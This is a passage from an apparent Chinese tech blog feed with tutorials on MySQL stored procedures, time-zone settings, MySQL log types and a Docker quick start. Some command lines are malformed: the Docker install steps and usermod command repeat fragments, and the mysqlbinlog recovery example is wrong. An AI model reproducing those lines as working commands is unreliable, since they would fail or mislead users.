DATE_FORMAT(DATE_SUB(CURDATE(), INTERVAL dayofyear(now())- days DAY), &quot;%Y%m%d&quot;);</span><br><span class="line">SET days &#x3D; days - 1;</span><br><span class="line">-- 拼接表名</span><br><span class="line">set @table_name &#x3D; CONCAT(&quot;tableName&quot;, dates);</span><br><span class="line">        -- 拼接需要执行SQL 语句，后面的内容需要根据实际情况替换掉</span><br><span class="line">        SET @sql &#x3D; CONCAT(&quot;ALTER TABLE &quot;, @table_name, &quot;</span><br><span class="line">          -- 需要执行的SQL </span><br><span class="line">          &quot;);</span><br><span class="line">        -- 预处理动态SQL 语句，其中stmt 是一个变量</span><br><span class="line">        PREPARE stmt FROM @sql;</span><br><span class="line">        -- 执行SQL 语句</span><br><span class="line">        EXECUTE stmt ;</span><br><span class="line">        -- 释放prepare</span><br><span class="line">        deallocate prepare stmt;</span><br><span class="line">-- 结束循环</span><br><span class="line">end WHILE;</span><br><span class="line">-- 结束定义语句</span><br><span class="line">end $$</span><br><span class="line">delimiter ;</span><br><span class="line">call wk();</span><br></pre></td></tr></table></figure><p>大致上就是这样，至此，一个完整的Mysql 存储过程就完成了。</p><blockquote><p>如何在终端执行Mysql 文件？</p></blockquote><p>SQL 脚本准备好了，有两种方式可以执行它。</p><ol><li>方式一：不进入Mysql 终端，直接在命令行终端执行</li><li>方式二：进入Mysql 终端，在Mysql 终端中执行</li></ol><p>这两种方式的共同点就是都需要已知Mysql 密码。</p><p>对于方式一，可以使用以下命令来执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p &lt; .&#x2F;modify_user_table.sql</span><br></pre></td></tr></table></figure><p>可以指定数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p databaseName &lt; .&#x2F;modify_user_table.sql</span><br></pre></td></tr></table></figure><p>对于方式二，可以使用以下命令来执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 进入Mysql 终端</span><br><span class="line">mysql -uroot -p </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 执行SQL 文件</span><br><span class="line">source .&#x2F;modify_user_table.sql</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://pein0119.github.io/2014/10/22/MySQL%E7%BB%88%E7%AB%AF%E6%89%A7%E8%A1%8CSQL%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">Mysql 终端执行SQL 文件</a></li><li><a href="https://www.cnblogs.com/geaozhang/p/6803423.html" target="_blank" rel="noopener">Mysql 存储过程中的变量定义</a></li><li><a href="https://www.cnblogs.com/easonjim/p/7966918.html" target="_blank" rel="noopener">Mysql 中的变量定义和赋值</a></li><li><a href="https://my.oschina.net/u/2331760/blog/3065637" target="_blank" rel="noopener">Mysql 存储过程中使用动态SQL 语句</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近面临一个需求，需要使用Mysql 写一段存储过程，对数据库中的数据表做批量操作。&lt;/p&gt;
&lt;p&gt;应该算是知识盲区了，花了一些时间去学习如何写好一个存储过程，最终也顺利写出来了，记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 查看修改默认时区</title>
    <link href="https://www.0x2beace.com/mysql-view-and-modify-the-default-time-zone/"/>
    <id>https://www.0x2beace.com/mysql-view-and-modify-the-default-time-zone/</id>
    <published>2020-07-25T15:43:57.000Z</published>
    <updated>2020-07-25T15:45:03.233Z</updated>
    
    <content type="html"><![CDATA[<p>在之前的笔记中，我们知道了时区相关的概念，以及如何在PHP 获取设置默认时区。</p><p>这篇笔记就来学习一下如何在Mysql 上获取设置默认时区。</p><a id="more"></a><h3 id="查看默认时区"><a href="#查看默认时区" class="headerlink" title="查看默认时区"></a>查看默认时区</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;%time_zone%&quot;;</span><br><span class="line">+------------------+--------+</span><br><span class="line">| Variable_name    | Value  |</span><br><span class="line">+------------------+--------+</span><br><span class="line">| system_time_zone | CST    |</span><br><span class="line">| time_zone        | SYSTEM |</span><br><span class="line">+------------------+--------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><h3 id="设置默认时区"><a href="#设置默认时区" class="headerlink" title="设置默认时区"></a>设置默认时区</h3><h4 id="设置当前会话"><a href="#设置当前会话" class="headerlink" title="设置当前会话"></a>设置当前会话</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET time_zone &#x3D; &quot;+8.00&quot;;</span><br><span class="line">mysql&gt; show variables like &quot;%time_zone%&quot;;</span><br></pre></td></tr></table></figure><p>此修改只会对当前会话有效。</p><h4 id="全局设置"><a href="#全局设置" class="headerlink" title="全局设置"></a>全局设置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET global time_zone &#x3D; &quot;+8.00&quot;;</span><br></pre></td></tr></table></figure><p>需要重启该会话，该配置才生效。</p><h4 id="编辑-my-ini"><a href="#编辑-my-ini" class="headerlink" title="编辑 my.ini"></a>编辑 my.ini</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 打开Mysql 的配置文件 my.ini</span><br><span class="line">[mysqld]</span><br><span class="line">default-time_zone &#x3D; &#39;+8:00&#39;</span><br></pre></td></tr></table></figure><p>需要重启Mysql 服务</p><h5 id="时间格式"><a href="#时间格式" class="headerlink" title="时间格式"></a>时间格式</h5><p>GMT（Greenwich Mean Time）：格林威治标准时间<br>UTC：世界标准时间<br>CST（China Standard Time）：中国标准时间</p><p>GMT + 8 = UTC + 8 = CST</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://majing.io/posts/10000004161181" target="_blank" rel="noopener">Mysql 查看修改时区 time_zone</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在之前的笔记中，我们知道了时区相关的概念，以及如何在PHP 获取设置默认时区。&lt;/p&gt;
&lt;p&gt;这篇笔记就来学习一下如何在Mysql 上获取设置默认时区。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>了解 Mysql 日志</title>
    <link href="https://www.0x2beace.com/understanding-the-mysql-log/"/>
    <id>https://www.0x2beace.com/understanding-the-mysql-log/</id>
    <published>2020-07-25T15:38:53.000Z</published>
    <updated>2020-07-31T12:39:49.199Z</updated>
    
    <content type="html"><![CDATA[<p>日志无论在哪里都是尤为重要的存在，所以这篇笔记的目的就是了解Mysql 日志的。</p><a id="more"></a><h2 id="日志简介"><a href="#日志简介" class="headerlink" title="日志简介"></a>日志简介</h2><p>Mysql 的日志主要分为四类，使用这些日志文件，可以查看Mysql 内部发生的事情，这四类日志分别是：</p><ul><li>错误日志：记录Mysql 服务的启动、运行或停止Mysql服务时出现的问题。</li><li>查询日志：记录建立的客户端连接和执行的语句。</li><li>二进制日志：记录所有更改数据的语句，可以用于数据恢复。</li><li>慢查询日志：记录所有执行时间超过 long_query_time 的所有查询或不使用索引的查询。</li></ul><h3 id="二进制日志"><a href="#二进制日志" class="headerlink" title="二进制日志"></a>二进制日志</h3><p>二进制日志主要记录 Mysql 数据库的变化。二进制日志以一种有效的格式，并且是事务安全的方式包含更新日志中可用的所有信息。</p><h4 id="启动和设置二进制日志"><a href="#启动和设置二进制日志" class="headerlink" title="启动和设置二进制日志"></a>启动和设置二进制日志</h4><p>默认情况下，二进制日志是关闭的，可以通过修改mysql 的配置文件来启动和设置二进制日志。</p><p>配置文件 my.ini 中有几个设置是关于二进制日志的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 如果需要启用，就在 mysqld 组下，加上 log-bin 选项</span><br><span class="line">[mysqld]</span><br><span class="line">log-bin</span><br><span class="line"></span><br><span class="line">log-bin [&#x3D;path&#x2F; [filename] ]</span><br><span class="line">expire_logs_days &#x3D; 10</span><br><span class="line">max_binlog_size &#x3D; 100M</span><br></pre></td></tr></table></figure><ol><li><code>log-bin</code>定义开启二进制日志，path 表示日志文件所在的目录路径，filename 指定了日志文件的名称。</li><li><code>expire_logs_days</code>定义了Mysql 清除过期日志的时间，即二进制日至的自动删除的天数。</li><li><code>max_binlog_size</code>定义了单个文件的大小限制，不能将变量设置为大于1GB或者小于4096B。默认值为1GB.</li></ol><blockquote><p>如何检查自己的二进制日志是否开启了呢？</p></blockquote><p>输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;log_%&#39;;</span><br></pre></td></tr></table></figure><h4 id="查看二进制日志"><a href="#查看二进制日志" class="headerlink" title="查看二进制日志"></a>查看二进制日志</h4><p>查看二进制文件个数及文件名，前提是开启了二进制日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show binary logs;</span><br></pre></td></tr></table></figure><h4 id="删除二进制日志"><a href="#删除二进制日志" class="headerlink" title="删除二进制日志"></a>删除二进制日志</h4><p>Mysql 也为我们提供了删除二进制日志的方法，有两种，作用不相同。</p><p>删除所有二进制日志文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; RESET MASTER;</span><br></pre></td></tr></table></figure><p>删除指定二进制日志文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 其中，binlog.000003 是指二进制文件的名称</span><br><span class="line">mysql&gt; PURGE MASTER LOGS TO &quot;binlog.000003&quot;;</span><br></pre></td></tr></table></figure><h4 id="使用二进制日志恢复数据库"><a href="#使用二进制日志恢复数据库" class="headerlink" title="使用二进制日志恢复数据库"></a>使用二进制日志恢复数据库</h4><p>如果启用了Mysql 的二进制日志，在数据库出现意外丢失数据时，可以使用 Mysqlbinlog 工具从指定时间点开始（例如，最后一次备份）直到现在。</p><p>Mysqlbinlog 恢复数据库的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; mysqlbinlog [option] filename | mysql -uuser -ppass</span><br></pre></td></tr></table></figure><p>实例：使用Mysqlbinlog 恢复Mysql 数据库到2019年1月30日15:27:48时的状态，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlbinlog --stop--date&#x3D;&quot;2019-01-30 15:27:48&quot; | path&#x2F;binlogfilename -uuser -ppass</span><br></pre></td></tr></table></figure><h4 id="暂停二进制日志功能"><a href="#暂停二进制日志功能" class="headerlink" title="暂停二进制日志功能"></a>暂停二进制日志功能</h4><p>因为修改Mysql 配置文件可以启用、停用二进制日志功能，但是需要重启Mysql 服务器。Mysql 为我们提供了一种更简单的方式可以暂停记录二进制日志。</p><p>暂停记录二进制日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET sql_log_bin &#x3D; 0;</span><br></pre></td></tr></table></figure><p>恢复记录二进制日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET sql_log_bin &#x3D; 1;</span><br></pre></td></tr></table></figure><h3 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h3><p>错误日志文件包含了当Mysqld 启动和停止时，以及服务器在运行过程中发生任何严重错误时的相关信息。错误日志默认是开启的。</p><h4 id="启动和设置错误日志"><a href="#启动和设置错误日志" class="headerlink" title="启动和设置错误日志"></a>启动和设置错误日志</h4><p>通过修改my.ini 配置文件，来启用或者停用错误日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 如果需要启用，就在 mysqld 组下，加上 log-error 选项</span><br><span class="line">[mysqld]</span><br><span class="line">log-error</span><br><span class="line"></span><br><span class="line">log-error&#x3D;[path&#x2F;filename]</span><br></pre></td></tr></table></figure><h4 id="查看错误日志"><a href="#查看错误日志" class="headerlink" title="查看错误日志"></a>查看错误日志</h4><p>首先使用如下命令查看错误日志的存储路径以及文件名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;log_error&#39;;</span><br></pre></td></tr></table></figure><h4 id="删除错误日志文件"><a href="#删除错误日志文件" class="headerlink" title="删除错误日志文件"></a>删除错误日志文件</h4><p>Mysql 的错误日志文件是以文本文件的形式存储在文件系统中，可以直接删除。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; flush logs;</span><br></pre></td></tr></table></figure><h3 id="通用查询日志"><a href="#通用查询日志" class="headerlink" title="通用查询日志"></a>通用查询日志</h3><p>通用查询日志记录了Mysql 的所有操作，包括启动和关闭服务、执行查询和更新语句等。</p><h4 id="启用和设置通用查询日志"><a href="#启用和设置通用查询日志" class="headerlink" title="启用和设置通用查询日志"></a>启用和设置通用查询日志</h4><p>同样的，打开Mysql 的my.ini 配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log</span><br><span class="line"></span><br><span class="line">log&#x3D;[path\filename]</span><br></pre></td></tr></table></figure><p>这里有两种方式，log 选项后面如果没有带任何参数表示使用Mysql 默认的存储位置，上面的也一样。</p><h4 id="查看通用查询日志"><a href="#查看通用查询日志" class="headerlink" title="查看通用查询日志"></a>查看通用查询日志</h4><p>可以通过log 设置的日志文件存储路径，去查看具体文件。</p><h3 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h3><p>慢查询日志记录查询时长超过指定时间的日志。通过慢查询日志，可以找出执行时间较长、执行效率较低的语句，然后进行优化。</p><h4 id="启用和设置慢查询日志"><a href="#启用和设置慢查询日志" class="headerlink" title="启用和设置慢查询日志"></a>启用和设置慢查询日志</h4><p>同样的，打开编辑Mysql 的my.ini 配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log-slow-queries</span><br><span class="line"></span><br><span class="line">log-slow-queries&#x3D;[path\filename]</span><br><span class="line">long_query_time&#x3D;n</span><br></pre></td></tr></table></figure><p>n 表示查询时间的极限值，如果超过了这个值，这个查询过程就会被记录到慢查询日志文件中。</p><p>查询慢查询日志同上。</p><p>上面这些日志配置的更改都需要重启服务器才能生效，另外还有一种方式可以查看运行时日志。</p><h3 id="启用实时日志"><a href="#启用实时日志" class="headerlink" title="启用实时日志"></a>启用实时日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; on;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 查看日志文件目录</span><br><span class="line">show variables like &#39;general_log_file&#39;;</span><br></pre></td></tr></table></figure><p>这种方式的好处就是不需要重启Mysql 服务。</p><p>如果需要禁用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; off;</span><br></pre></td></tr></table></figure><blockquote><p>关于平时应该打开哪些日志的问题。</p></blockquote><p>日志的开启既会影响Mysql 的性能，又会占用大量的磁盘空间。<br>因此如果不必要，应尽可能的少开启日志，根据不同的使用环境，考虑开启不同的日志。</p><p>例如：在开发环境中优化查询低效率的语句，可以开启慢查询日志；<br>如果需要记录用的所有查询操作，可以开启通用查询日志；<br>如果需要记录数据的变更，可以开启二进制日志；<br>错误日志默认开启；</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日志无论在哪里都是尤为重要的存在，所以这篇笔记的目的就是了解Mysql 日志的。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Docker 快速上手</title>
    <link href="https://www.0x2beace.com/docker-quick-start/"/>
    <id>https://www.0x2beace.com/docker-quick-start/</id>
    <published>2020-07-23T04:32:57.000Z</published>
    <updated>2020-08-22T01:02:14.223Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记的主要目的是用来记录学习 <code>Docker</code> 的过程。<code>Docker</code>这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。</p><a id="more"></a><h2 id="诞生"><a href="#诞生" class="headerlink" title="诞生"></a>诞生</h2><p>软件开发最大的麻烦事之一，就是环境配置。</p><p>开发者常常说的一句话：它在我的机器上可以跑了。言下之意就是，其他机器可能跑不了。因为可以正常跑的前提是：操作系统的设置，各种软件和组件、库的安装，只有它们都正确了，软件才能正常运行。</p><p>配置环境如此麻烦，换一台机器，就得重来一次，旷日费时。因此，聪明的人们就想到，能不能从根本上解决问题。软件可以带环境安装。（这里说的软件是指最终要运行的工程）</p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>虚拟机（virtual machine，简称VM）就是带环境安装的一种解决方案。它可以在一个操作系统中运行另外一种操作系统。比如在Windows系统中运行Linux 系统。应用程序对此毫无感觉，因为虚拟机看上去跟真是系统一模一样。而对于底层系统来说，虚拟机就是一个普通文件，不需要就删掉，对其他部分没有影响。</p><p><strong>虚拟机（VM）是物理硬件的抽象，</strong> 将一台服务器转变为多台服务器。</p><p>虽然用户可以通过虚拟机还原软件的原始环境，但是这个方案有几个缺点。在后面会做比较。</p><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>由于虚拟机存在一些缺点，Linux 发展出了另一种轻量级的操作系统虚拟化解决方案，Linux 容器（Linux Containers，缩写为 LXC）。</p><p><strong>Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。</strong></p><p><strong>容器是应用层的抽象，它将代码和依赖关系打包在一起。</strong> 多个容器可以在同一台机器上运行，并与其他容器共享操作系统内核，每个容器在用户空间中作为独立进程运行。容器占用的空间比VM少（容器映像的大小通常为几十MB），可以处理更多的应用程序，并且需要更少的VM和操作系统。</p><p>由于容器是进程级别的，相比虚拟机有很多的优势。后面会做比较。</p><h2 id="Docker-是什么"><a href="#Docker-是什么" class="headerlink" title="Docker 是什么"></a>Docker 是什么</h2><p><strong>Docker 属于Linux 容器的一种封装，提供简单易用的容器使用接口。</strong> 它是目前最流行的 Linux 容器解决方案。</p><h3 id="Docker-与虚拟机的区别"><a href="#Docker-与虚拟机的区别" class="headerlink" title="Docker 与虚拟机的区别"></a>Docker 与虚拟机的区别</h3><table><thead><tr><th>名称</th><th>占用资源</th><th>启动速度</th><th>级别</th></tr></thead><tbody><tr><td>Docker</td><td>占用资源少</td><td>启动快</td><td>轻量级</td></tr><tr><td>虚拟机</td><td>占用资源多</td><td>启动慢</td><td>重量级</td></tr></tbody></table><h3 id="Docker-CE-与-Docker-EE"><a href="#Docker-CE-与-Docker-EE" class="headerlink" title="Docker CE 与 Docker EE"></a>Docker CE 与 Docker EE</h3><p><strong>Docker CE(Docker Community Edition)</strong> 是社区版，简单理解是免费使用，提供小企业与小的IT团队使用,希望从Docker开始，并尝试基于容器的应用程序部署。</p><p><strong>Docker EE(Docker Enterprise Edition)</strong> 是企业版，收费。提供功能更强。适合大企业与打的IT团队。为企业开发和IT团队设计，他们在生产中构建、交付和运行业务关键应用程序</p><p>Docker CE 有三种类型的更新通道：stable、test和 nightly</p><ul><li>Stable 提供一般可用性的最新版本</li><li>Test 提供在一般可用之前准备好进行测试的预发布。</li><li>Nightly 提供下一个主要版本的最新正在进行的工作。</li></ul><h2 id="安装-Docker-CE"><a href="#安装-Docker-CE" class="headerlink" title="安装 Docker-CE"></a>安装 Docker-CE</h2><p>这里以Ubuntu 18.04 为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. sudo apt install apt-transport-https ca-certificates software-properties-common curl-transport-https ca-certificates software-properties-common curl</span><br><span class="line">2. curl -fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add --fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -</span><br><span class="line">3. sudo add-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \</span><br><span class="line">$(lsb_release -cs) stable&quot;</span><br><span class="line">4. sudo apt update</span><br><span class="line">5. sudo apt install docker-ce</span><br></pre></td></tr></table></figure><p>将当前用户添加到docker 用户组，可以不用sudo 运行docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo groupadd docker</span><br><span class="line">$ sudo usermod -aG docker $USER-aG docker $USER</span><br></pre></td></tr></table></figure><h3 id="Docker-镜像"><a href="#Docker-镜像" class="headerlink" title="Docker 镜像"></a>Docker 镜像</h3><p>Docker 镜像就是一个只读的模板。</p><p>例如：一个镜像可以包含一个完整的 ubuntu 操作系统环境，里面仅安装了 Apache 或用户需要的其它应用程序。</p><p>镜像可以用来创建 Docker 容器。</p><h3 id="Docker-容器"><a href="#Docker-容器" class="headerlink" title="Docker 容器"></a>Docker 容器</h3><p>Docker 利用容器来运行应用。</p><p>容器是从镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。</p><p>可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p><blockquote><p>注：镜像是只读的，容器在启动的时候创建一层可写层作为最上层。</p></blockquote><h3 id="Docker-仓库"><a href="#Docker-仓库" class="headerlink" title="Docker 仓库"></a>Docker 仓库</h3><p>仓库是集中存放镜像文件的场所。有时候会把仓库和仓库注册服务器（Registry）混为一谈，并不严格区分。实际上，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像（image），每个镜像有不同的标签（tag）。</p><p>仓库分为公开仓库（Public）和私有仓库（Private）两种形式。</p><p>最大的公开仓库是 Docker Hub，存放了数量庞大的镜像供用户下载。 国内的公开仓库包括 Docker Pool 等，可以提供大陆用户更稳定快速的访问。</p><p>当然，用户也可以在本地网络内创建一个私有仓库。</p><p>当用户创建了自己的镜像之后就可以使用 push 命令将它上传到公有或者私有仓库，这样下次在另外一台机器上使用这个镜像时候，只需要从仓库上 pull 下来就可以了。</p><blockquote><p>注：Docker 仓库的概念跟 Git 类似，注册服务器可以理解为 GitHub 这样的托管服务。</p></blockquote><h4 id="镜像和容器的区别"><a href="#镜像和容器的区别" class="headerlink" title="镜像和容器的区别"></a>镜像和容器的区别</h4><p>容器和镜像的关系如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200723123056.png" alt=""></p><p><code>Dockerfile</code>用于定义镜像，依赖镜像来运行容器，仓库则是存放镜像的地方。</p><h4 id="Dockerfile-是什么？"><a href="#Dockerfile-是什么？" class="headerlink" title="Dockerfile 是什么？"></a>Dockerfile 是什么？</h4><p>Dockerfile 是一个创建Docker 镜像所需的文件，其中会包含一组指令来告诉Docker 如何构建我们的镜像。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ cat Dockerfile</span><br><span class="line"># 使用官方Python运行时作为父映像</span><br><span class="line">FROM python:2.7-slim</span><br><span class="line"></span><br><span class="line"># 将工作目录设置为&#x2F;app</span><br><span class="line">WORKDIR &#x2F;app</span><br><span class="line"></span><br><span class="line"># 将当前目录内容复制到容器at &#x2F;app</span><br><span class="line">COPY . &#x2F;app</span><br><span class="line"></span><br><span class="line"># 安装requirements.txt中指定的任何需要的包</span><br><span class="line">RUN pip install --trusted-host pypi.python.org -r requirements.txt</span><br><span class="line"></span><br><span class="line"># #让80 端口号对外开放</span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line"># 定义环境变量</span><br><span class="line">ENV NAME World</span><br><span class="line"></span><br><span class="line"># 在容器启动时运行app.py</span><br><span class="line">CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure><h4 id="如何用镜像创建一个容器？"><a href="#如何用镜像创建一个容器？" class="headerlink" title="如何用镜像创建一个容器？"></a>如何用镜像创建一个容器？</h4><p>首先，我们需要一个镜像，然后才能创建容器。想要在Docker 上创建一个镜像，非常简单。</p><ol><li>cd 到项目文件夹中</li><li>使用 <code>docker build --tag=mydockerapp .</code> 命令，创建一个Docker 镜像。–tag 选项命名。</li><li>使用 <code>docker run -d -p 4000:80 mydockerapp</code>命令，创建一个新容器。</li></ol><p>该命令表示：Docker 以<code>mydockerapp</code>镜像创建一个新容器，同时以分离模式在后台运行该应用程序，将该容器的80端口映射到主机的4000端口。</p><p>其中：<br><code>-d</code>：让容器在后台运行<br><code>-p</code>：将容器内部端口映射到指定的主机端口上。<br><code>-P</code> :是容器内部端口随机映射到主机的端口上。</p><h4 id="Docker-网络端口映射"><a href="#Docker-网络端口映射" class="headerlink" title="Docker 网络端口映射"></a>Docker 网络端口映射</h4><p>使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -p 4000:80 mydocker</span><br></pre></td></tr></table></figure><p>然后用<code>docker container ls</code>查看容器列表</p><p>下图的意思表示：将该容器的端口80映射到4000，从而生成正确的URL <a href="http://localhost:4000。">http://localhost:4000。</a></p><p>Docker 开放了 80 端口映射到主机端口 4000 上。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200723123121.png" alt=""></p><h4 id="Docker-容器连接"><a href="#Docker-容器连接" class="headerlink" title="Docker 容器连接"></a>Docker 容器连接</h4><p>前面我们实现了通过网络端口来访问运行在 docker 容器内的服务。下面我们来实现通过端口连接到一个 docker 容器</p><h4 id="如何运行负载均衡应用？"><a href="#如何运行负载均衡应用？" class="headerlink" title="如何运行负载均衡应用？"></a>如何运行负载均衡应用？</h4><p>在开始之前，你得首先满足以下条件：</p><ol><li>安装Docker 1.13或更高版本。</li><li>了解如何创建容器。</li><li>确保已经创建镜像并发布到注册表。我们在这里需要使用该共享镜像。</li><li>确保镜像作为已部署的容器运行，并能访问。</li></ol><p>确保有<code>docker-compose.yml</code>配置文件，然后依次执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init</span><br><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br><span class="line"># 顺利的话，就能直接部署成功了。使用docker container ls 可以看到正在运行的实例。</span><br><span class="line"># 使用 curl http:&#x2F;&#x2F;localhost:4000 或者是刷新浏览器。</span><br><span class="line"># 无论以哪种方式，容器ID 